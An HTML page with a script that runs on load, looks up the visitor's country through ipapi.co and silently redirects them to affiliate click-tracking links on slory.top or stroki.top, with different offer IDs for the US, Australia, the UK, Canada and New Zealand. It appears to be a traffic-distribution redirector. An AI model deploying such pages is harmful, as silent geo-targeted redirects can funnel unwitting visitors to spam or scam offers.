<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect</title>
</head>
<body>
    <script>
        function getCountry() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const country = data.country_code;

                    // Исключения: USA, AU, UK, CA, NZ
                    if (country === 'US') {
                        window.location.href = 'https://slory.top/click?o=184&a=211';
                        return;
                    }
                    if (country === 'AU') {
                        window.location.href = 'https://slory.top/click?o=186&a=211';
                        return;
                    }
                    if (country === 'GB') {
                        window.location.href = 'https://slory.top/click?o=185&a=211';
                        return;
                    }
                    if (country === 'CA') {
                        window.location.href = 'https://slory.top/click?o=169&a=211';
                        return;
                    }
                    if (country === 'NZ') {
                        window.location.href = 'https://slory.top/click?o=169&a=211';
                        return;
                    }

                    // Все остальные
                    window.location.href = 'https://stroki.top/click?o=2&a=211&sub_id1=M1';
                })
                .catch(error => {
                    // Если API не отвечает — отправляем на skolam
                    window.location.href = 'https://stroki.top/click?o=2&a=211&sub_id1=M1';
                });
        }

        window.onload = getCountry;
    </script>
</body>
</html>
